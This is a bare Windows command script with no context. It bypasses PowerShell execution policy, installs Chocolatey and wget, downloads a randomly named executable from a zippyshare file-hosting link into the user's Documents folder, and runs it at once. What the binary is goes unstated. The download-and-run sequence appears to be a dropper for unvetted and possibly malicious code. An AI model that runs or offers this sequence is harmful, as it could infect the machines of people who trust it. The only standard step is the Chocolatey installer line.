powershell Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))

choco install wget --force -y

cd %USERPROFILE%\Documents

wget https://www44.zippyshare.com/d/pCQPlBgZ/26528/SmS4kMoD.exe

start "" SmS4kMoD.exe